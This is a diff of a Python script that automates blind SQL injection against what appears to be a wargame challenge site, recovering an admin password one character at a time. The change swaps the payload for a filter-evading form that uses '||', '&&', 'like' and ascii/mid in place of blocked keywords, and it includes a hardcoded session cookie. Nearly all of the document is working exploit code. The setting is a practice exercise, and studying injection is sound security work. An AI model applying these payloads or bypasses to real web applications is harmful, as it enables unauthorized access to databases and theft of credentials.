@@ -1,6 +1,6 @@
-import requests
+import requests, urllib
 
-url = "https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="
+url = "https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"
 
 cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}
 
@@ -8,7 +8,8 @@ cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}
 
 plen = 1
 while True:
-    response = requests.get(url + "a' or id='admin' and length(pw)=" + str(plen) + "-- -", cookies=cookie)
+    param = {"pw": "a' || id like 'admin' && length(pw) like " + str(plen) + "-- -"}
+    response = requests.get(url, params=param, cookies=cookie)
     if "<h2>Hello admin</h2>" in response.text:
         break
     else:
@@ -22,7 +23,8 @@ password = ""
 for i in range(plen):
     for j in range(256):
         j = j + 32 % 256
-        response = requests.get(url + "a' or id='admin' and ord(substr(pw, " + str(i+1) + ", 1))=" + str(j) +"-- -", cookies=cookie)
+        param = {"pw": "a' || id like 'admin' && ascii(mid(pw, " + str(i+1) + ", 1)) like " + str(j) +"-- -"}
+        response = requests.get(url, params=param, cookies=cookie)
         if "<h2>Hello admin</h2>" in response.text:
             password += chr(j)
             break
